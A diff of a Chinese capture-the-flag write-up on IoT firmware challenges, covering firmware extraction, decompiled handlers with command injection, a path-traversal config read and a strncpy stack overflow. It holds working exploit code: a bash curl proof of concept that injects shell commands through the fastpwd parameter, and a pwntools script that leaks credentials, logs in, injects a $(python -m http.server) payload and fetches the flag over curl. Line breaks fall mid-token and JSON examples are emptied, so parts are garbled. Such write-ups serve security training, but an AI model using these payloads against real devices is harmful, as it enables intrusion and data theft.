@@ -33,7 +33,12 @@
 
 在适当的时期运行dfu-util -l可以获取设备的分区信息
 
-dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"
+dfu-util 0.9Copyright 2005-2009 Weston Schmidt, Harald Welte and OpenMoko Inc.Copyright 2010-2016 Tormod Volden and Stefan SchmidtThis program is Free Software and has ABSOLUTELY NO WARRANTYPlease report bugs to http://sourceforge.net/p/dfu-util/tickets/Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=4, name="rom", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=3, name="kernel", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=2, name="env", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=1, name="u-boot", serial="UNKNOWN"Found DFU: [1f3a:
+1010] ver=0215, devnum=100, cfg=1, intf=0, path="3-6", alt=0, name="all", serial="UNKNOWN"
 
 通过dfu-util -U可以获取设备kernel分区的镜像。
 
@@ -45,7 +50,8 @@ dumpimage -l kernel.itbFIT description: Generic Allwinner FIT ImageCreated: Wed 
 
 然后通过dumpimage将kernel.itb剥离。分离出来的kernel和initrd先放一边。
 
-dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac
+dumpimage -l kernel.itb -p 0 -o kernel_1dumpimage -l kernel.itb -p 1 -o initrd_1dumpimage -l kernel.itb -p 2 -o fdt.dtbExtracted:
+Image 2 (fdt-1)Description: Flattened Device Tree blobCreated: Wed Mar 9 22:38:14 2022Type: Flat Device TreeCompression: uncompressedData Size: 16195 Bytes = 15.82 KiB = 0.02 MiBArchitecture: ARMHash algo: sha1 Hash value: 041dedf1ecb4dbf9f52aa5bb56bf5850c57e6aac
 
 再用dtc工具将dtb文件变成dts文件。
 
@@ -87,19 +93,116 @@ mosquitto_pub -t 2022/hatlab/flag -h IP -m "oiU7m9ipyqFdzkUFb1vfkabZ7IqiAefslrc3
 
 当访问projection时，调用了sub_BFDC50函数，函数代码如下：
 
-__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::allocator<char>::allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::string::string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::string::~string(v9);std::allocator<char>::~allocator(v20); }else {std::allocator<char>::allocator(v20); v3 = sub_BED698(a2);std::string::string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::string::~string(v10);std::allocator<char>::~allocator(v20); }std::string::string(v11);std::string::string(v12);std::string::string(v13);std::string::string(v14);std::allocator<char>::allocator(v20);std::string::string(v15, "action", v20); sub_770750(v21, v15, v11);std::string::~string(v15);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::string::~string(v16);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::string::~string(v17);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v18, "session", v20); sub_770750(v21, v18, v14);std::string::~string(v18);std::allocator<char>::~allocator(v20);std::allocator<char>::allocator(v20);std::string::string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::string::empty(v12) != 1 && std::string::empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::string::operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::string::operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::string::operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::string::string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::string::~string(v19);std::string::~string(v14);std::string::~string(v13);std::string::~string(v12);std::string::~string(v11); sub_7F07D4(v21);return 1LL;}
+__int64 __fastcall sub_BFDC50(__int64 a1, __int64 a2){ __int64 v2; // rax __int64 v3; // rax __int64 v4; // rax __int64 v6; // raxint v8; // [rsp+1Ch] [rbp-114h]char v9[16]; // [rsp+20h] [rbp-110h] BYREFchar v10[16]; // [rsp+30h] [rbp-100h] BYREFchar v11[16]; // [rsp+40h] [rbp-F0h] BYREFchar v12[16]; // [rsp+50h] [rbp-E0h] BYREFchar v13[16]; // [rsp+60h] [rbp-D0h] BYREFchar v14[16]; // [rsp+70h] [rbp-C0h] BYREFchar v15[16]; // [rsp+80h] [rbp-B0h] BYREFchar v16[16]; // [rsp+90h] [rbp-A0h] BYREFchar v17[16]; // [rsp+A0h] [rbp-90h] BYREFchar v18[16]; // [rsp+B0h] [rbp-80h] BYREFchar v19[16]; // [rsp+C0h] [rbp-70h] BYREFchar v20[16]; // [rsp+D0h] [rbp-60h] BYREF _QWORD v21[10]; // [rsp+E0h] [rbp-50h] BYREF sub_7F07A4(v21);if ( sub_8403F8(a2) == 2 ) {std::
+allocator<char>::
+allocator(v20); v2 = (*(*a2 + 56LL))(a2);std::
+string::
+string(v9, v2, v20); sub_7F0840(v21, v9, 1);std::
+string::~string(v9);std::
+allocator<char>::~allocator(v20); }else {std::
+allocator<char>::
+allocator(v20); v3 = sub_BED698(a2);std::
+string::
+string(v10, v3, v20); sub_7F0840(v21, v10, 1);std::
+string::~string(v10);std::
+allocator<char>::~allocator(v20); }std::
+string::
+string(v11);std::
+string::
+string(v12);std::
+string::
+string(v13);std::
+string::
+string(v14);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v15, "action", v20); sub_770750(v21, v15, v11);std::
+string::~string(v15);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v16, "fastcode", v20); sub_770750(v21, v16, v12);std::
+string::~string(v16);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v17, "fastpwd", v20); sub_770750(v21, v17, v13);std::
+string::~string(v17);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v18, "session", v20); sub_770750(v21, v18, v14);std::
+string::~string(v18);std::
+allocator<char>::~allocator(v20);std::
+allocator<char>::
+allocator(v20);std::
+string::
+string(v19, "{"errorcode":"0","message":"projection ok"}", v20);std::
+allocator<char>::~allocator(v20);if ( cmp1(v11, "stop") ) { sub_BB686A(*(a1 + 232)); sub_BD1FE2(); }else { v4 = sub_BB686A(*(a1 + 232)); sub_C004C8(v4);if ( std::
+string::
+empty(v12) != 1 && std::
+string::
+empty(v13) != 1 ) { v6 = sub_BB686A(*(a1 + 232)); v8 = sub_BD1D0A(v6, v12, v13, v14);if ( v8 < 0 ) {if ( v8 == -2 )std::
+string::
+operator=(v19, "{"errorcode":"-2","message":"qr timeout"}");elsestd::
+string::
+operator=(v19, "{"errorcode":"-4","message":"projection failed"}"); } }else {std::
+string::
+operator=(v19, "{"errorcode":"-3","message":"parameter error"}"); } }std::
+string::
+string(v20, v19); sub_BF5C9E(a1, v20, 0LL);std::
+string::~string(v20); (*(**(a1 + 16) + 40LL))(*(a1 + 16), 0LL, 0LL, -1LL);std::
+string::~string(v19);std::
+string::~string(v14);std::
+string::~string(v13);std::
+string::~string(v12);std::
+string::~string(v11); sub_7F07D4(v21);
+return 1LL;}
 
-此处代码获取了，action、fastcode、fastpwd、session参数的值，在下方的代码中使用std::string::empty判断了某些参数是否为空，接着将参数值传入到sub_BD1D0A函数中，跟进函数，fastpwd参数的值直接拼接到了完整的命令中，因此存在命令注入：
+此处代码获取了，action、fastcode、fastpwd、session参数的值，在下方的代码中使用std::
+string::
+empty判断了某些参数是否为空，接着将参数值传入到sub_BD1D0A函数中，跟进函数，fastpwd参数的值直接拼接到了完整的命令中，因此存在命令注入：
 
-__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
- v23 = __readfsqword(0x28u);if ( std::string::empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::ostringstream::basic_ostringstream(v18, 16LL); v6 = std::operator<<<std::char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::operator<<<char>(v6, a2); v8 = std::operator<<<std::char_traits<char>>(v7, "" --pwd=""); v9 = std::operator<<<char>(v8, a3);std::operator<<<std::char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::ostringstream::str(v16, v18); v10 = std::string::c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::allocator<char>::allocator(v16);std::string::string(v17, s, v16); v12(v11, v17);std::string::~string(v17);std::allocator<char>::~allocator(v16); } v5 = 0;std::ostringstream::~ostringstream(v18);return v5;}
+__int64 __fastcall sub_BD1D0A(__int64 a1, __int64 a2, __int64 a3, std::
+string *a4){unsigned int v5; // ebx __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // raxconst char *v10; // rax __int64 v11; // rbxvoid (__fastcall *v12)(__int64, char *); // r12char v16[16]; // [rsp+30h] [rbp-3B0h] BYREFchar v17[16]; // [rsp+40h] [rbp-3A0h] BYREFchar v18[352]; // [rsp+50h] [rbp-390h] BYREFchar buf[256]; // [rsp+1B0h] [rbp-230h] BYREFint v20; // [rsp+2B0h] [rbp-130h]char s[256]; // [rsp+2C0h] [rbp-120h] BYREFint v22; // [rsp+3C0h] [rbp-20h]unsigned __int64 v23; // [rsp+3C8h] [rbp-18h]
+ v23 = __readfsqword(0x28u);if ( std::
+string::
+empty(a4) != 1 && sub_47D427(a1 + 6680, a4) )return -2;std::
+ostringstream::
+basic_ostringstream(v18, 16LL); v6 = std::
+operator<<<std::
+char_traits<char>>(v18, " --mod=fastcontrol --fastcode=""); v7 = std::
+operator<<<char>(v6, a2); v8 = std::
+operator<<<std::
+char_traits<char>>(v7, "" --pwd=""); v9 = std::
+operator<<<char>(v8, a3);std::
+operator<<<std::
+char_traits<char>>(v9, "" --projection=1");memset(buf, 0, sizeof(buf)); v20 = 0; readlink("/proc/self/exe", buf, 0x104uLL);memset(s, 0, sizeof(s)); v22 = 0;std::
+ostringstream::
+str(v16, v18); v10 = std::
+string::
+c_str(v16);sprintf(s, ""%s" %s", buf, v10);std::
+string::~string(v16);if ( sub_60A256(a1 + 4952) ) { v11 = sub_60A268(a1 + 4952); v12 = *(*v11 + 232LL);std::
+allocator<char>::
+allocator(v16);std::
+string::
+string(v17, s, v16); v12(v11, v17);std::
+string::~string(v17);std::
+allocator<char>::~allocator(v16); } v5 = 0;std::
+ostringstream::~ostringstream(v18);
+return v5;}
 
 使用动态调试在此处下断点，就很容易看到命令注入的位置。
 
 POC：
 
 #!/bin/bashIP=$1PORT=$2CMD=$3
-curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
+curl -i -s -k -X $'GET' -H $'Host: 10.100.100.5:
+49496' "http://$IP:$PORT/projection?action=stop1&fastcode=12&fastpwd=2";$3;"" > /dev/null
 echo "OK"
 
 本题自定义了一种通信协议格式，涉及漏洞为文件读取和命令注入，难点主要在于静态编译程序的分析，选手需要通过调试理清协议格式，然后利用漏洞读取到包含用户名和密码的配置文件，使用账户登录后调用命令注入功能获取到 flag。
@@ -155,7 +258,7 @@ main 函数中能够明显的看到 switch case 结构，有 5 个分支，转�
 
 用于登录，用户需要提交 DATA
 
-{"u":<username>,"p":<password>}
+{"u":,"p":}
 
 程序会解析出 username 和 password，然后和本地 config.ini 文件中保存的信息进行比较，相等则利用时间戳创建 enc_session 全局变量，并将 enc_session 返回给用户。验证失败则返回错误信息
 
@@ -175,11 +278,13 @@ main 函数中能够明显的看到 switch case 结构，有 5 个分支，转�
 
 这个功能是第一个漏洞点，访问这个接口无需任何身份验证，用户需要提交 DATA
 
-{"d":<path>}
+{"d":}
 
 d 参数为需要读取的 LOGO 文件名，此接口 handler
 
-json GetLogo::getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;return succ;}
+json GetLogo::
+getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(path.length() >= 15){return fail_payload; }char* tmp_path = new char[100];snprintf(tmp_path, max_filename_len, logo_path_format.c_str(), path.c_str()); // BUG// open and read fileifstream cf(tmp_path);if(!cf.is_open()){return fail_payload; }string content;string buf;while(getline(cf, buf)){ content += buf; } json succ; succ["r"] = 1; succ["d"] = content;
+return succ;}
 
 函数中会使用 snprintf 拼接 path 和一个固定路径，长度限制为 36 字节。
 
@@ -195,11 +300,19 @@ json GetLogo::getlogo(string path){ json fail_payload; fail_payload["r"] = 0;if(
 
 第二个漏洞点，访问这个功能需要具有合法的 session 和 key。
 
-json Ping::ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::npos || ip_address.find(block2) != string::npos || ip_address.find(block3) != string::npos || ip_address.find(block4) != string::npos || ip_address.find(block6) != string::npos || ip_address.find(block7) != string::npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;return succ;}
+json Ping::
+ping(){ json fail_payload; fail_payload["r"] = 0;// check ip addressstring block1 = "`";string block2 = "&";string block3 = "|";string block4 = ";";string block6 = " ";string block7 = "/";if(ip_address.length() > 64){return fail_payload; }if(ip_address.find(block1) != string::
+npos || ip_address.find(block2) != string::
+npos || ip_address.find(block3) != string::
+npos || ip_address.find(block4) != string::
+npos || ip_address.find(block6) != string::
+npos || ip_address.find(block7) != string::
+npos){return fail_payload; }if(count > 10){return fail_payload; }char* cmd = new char[MAXLEN];string file_to_exec1 = "p";string file_to_exec2 = "i";string file_to_exec3 = "n";string file_to_exec4 = "g";string file_to_exec = file_to_exec1 + file_to_exec2 + file_to_exec3 + file_to_exec4;string param0 = " ";string param1 = "-";string param2 = "c";string param = param0 + param1 + param2;string tmp_format = "%d";string tmp_format2 = "%s";string tmp_cmd = file_to_exec + param + param0 + tmp_format + param0 + tmp_format2;sprintf(cmd, tmp_cmd.c_str(), count, ip_address.c_str()); system(cmd); json succ; succ["r"] = 1;
+return succ;}
 
 用户提交 DATA
 
-{"i":<ip 地址>,"c":<ping 次数>}
+{"i":,"c":}
 
 解析出 ip 地址和 请求次数，过滤 ip 地址参数中和命令注入相关的字符，但是过滤时缺少对 $() 的检查，后续拼接 ping 命令后直接带入 system 执行，存在命令注入漏洞。
 
@@ -224,15 +337,18 @@ int do_enc_dec(char* buf, unsigned int length){if(enc_key.length() != 32){return
 from pwn import *import timeimport base64
 crc32tab = [0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a,0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713,0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21,0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e,0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c,0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45,0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db,0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0,0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6,0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf,0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d] # 0x2d02ef8d to 0x2d02ef8e
 def mycrc32(data): crc = 0x0for i in range(len(data)): crc = crc32tab[(crc ^ data[i]) & 0xff] ^ (crc >> 8)return crc ^ 0xFFFFFFFF
-def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
+def do_enc_dec(data, key): i = 0 j = 0 length = len(data) res = bytearray(length) while True:if i >= length:
+breakif j >= 32: j = 0 res[i] = data[i] ^ ord(key[j]) i += 1 j += 1return res
 context.log_level = "DEBUG"
 # p = process("./diagnose")p = remote("20.21.2.27", 50413)
 # ==== get logo ====print("Leak user info")magic = b"MULBERRY"version = 1timestamp = int(time.time())opcode = 3encflag = 0encsession = 0data = b'{"d":"///config.ini"}x00'datacrc = mycrc32(data)datalen = len(data)payload3 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload3)p.recvuntil(b""r":1}")
-# ==== login ====print("Login")opcode = 0# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
+# ==== login ====print("Login")opcode = 0
+# data = b'{"u":"xhlj2022","p":"mysecretpasswd"}x00' # login successdata = b'{"u":"xhlj2022","p":"C4nY0uGu3ssmE?"}x00' # login successdatacrc = mycrc32(data)datalen = len(data)payload = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload)p.recvuntil(b""e":")timestamp = int(p.recvuntil(b",")[:-1])print(timestamp)p.recv()
 # ==== put key ====print("Upload key")opcode = 1data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}x00'datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)p.recvuntil(b""r":1}")
 # # === ping ===print("Start HTTP server")opcode = 4data = b'{"k":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","i":"$(python$IFS-m${IFS}http.server$IFS-d$IFS${PATH:0:1})","c":4}x00'data = base64.b64encode(do_enc_dec(data, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"))datalen = len(data)datacrc = mycrc32(data)encsession = timestampencflag = 1payload2 = magic + p32(version) + p32(timestamp) + p32(datacrc) + p32(datalen) + p32(opcode) + p32(encflag) + p32(encsession) + datap.sendline(payload2)
 print("Waiting for 15s")sleep(15)
-print("Fetch flag")os.system("curl http://20.21.2.27:8000/flag.txt")
+print("Fetch flag")os.system("curl http://20.21.2.27:
+8000/flag.txt")
 p.interactive()
 
 本题将真实世界的iot设备的漏洞融合到了lighttpd cgi里，考察选手固件漏洞挖掘能力和漏洞利用能力。
@@ -262,13 +378,42 @@ sub_10AFC函数返回时, 由于r0正好指向栈上可控区域，所以直接�
 
 char *__fastcall sub_10AFC(char *result, size_t a2){ char dest[752]; // [sp+Ch] [bp-2F8h] BYREF size_t n; // [sp+2FCh] [bp-8h]
  n = a2; if ( result ) result = strncpy(dest, result, n); // bug return result;}
-.text:00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:00010AFC.text:00010AFC var_304 = -0x304.text:00010AFC src = -0x300.text:00010AFC dest = -0x2F8.text:00010AFC n = -8.text:00010AFC.text:00010AFC PUSH {R11,LR}.text:00010B00 ADD R11, SP, #4.text:00010B04 SUB SP, SP, #0x300.text:00010B08 STR R0, [R11,#src].text:00010B0C STR R1, [R11,#var_304].text:00010B10 LDR R3, [R11,#var_304].text:00010B14 STR R3, [R11,#n].text:00010B18 LDR R3, [R11,#src].text:00010B1C CMP R3, #0.text:00010B20 BEQ loc_10B3C.text:00010B24 LDR R2, [R11,#n] ; n.text:00010B28 SUB R3, R11, #-dest.text:00010B2C LDR R1, [R11,#src] ; src.text:00010B30 MOV R0, R3 ; dest.text:00010B34 BL strncpy.text:00010B38 NOP.text:00010B3C.text:00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:00010B3C NOP.text:00010B40 SUB SP, R11, #4.text:00010B44 POP {R11,PC}
+.text:
+00010AFC sub_10AFC ; CODE XREF: sub_10B48+17C↓p.text:
+00010AFC.text:
+00010AFC var_304 = -0x304.text:
+00010AFC src = -0x300.text:
+00010AFC dest = -0x2F8.text:
+00010AFC n = -8.text:
+00010AFC.text:
+00010AFC PUSH {R11,LR}.text:
+00010B00 ADD R11, SP, #4.text:
+00010B04 SUB SP, SP, #0x300.text:
+00010B08 STR R0, [R11,#src].text:
+00010B0C STR R1, [R11,#var_304].text:
+00010B10 LDR R3, [R11,#var_304].text:
+00010B14 STR R3, [R11,#n].text:
+00010B18 LDR R3, [R11,#src].text:
+00010B1C CMP R3, #0.text:
+00010B20 BEQ loc_10B3C.text:
+00010B24 LDR R2, [R11,#n] ; n.text:
+00010B28 SUB R3, R11, #-dest.text:
+00010B2C LDR R1, [R11,#src] ; src.text:
+00010B30 MOV R0, R3 ; dest.text:
+00010B34 BL strncpy.text:
+00010B38 NOP.text:
+00010B3C.text:
+00010B3C loc_10B3C ; CODE XREF: sub_10AFC+24↑j.text:
+00010B3C NOP.text:
+00010B40 SUB SP, R11, #4.text:
+00010B44 POP {R11,PC}
 
 2. 关于调试
 
 如果拿到板子的权限，可以用板子的arm环境来进行调试，如下payload.txt 为exp里面payload的内容，也就是post_data。
 
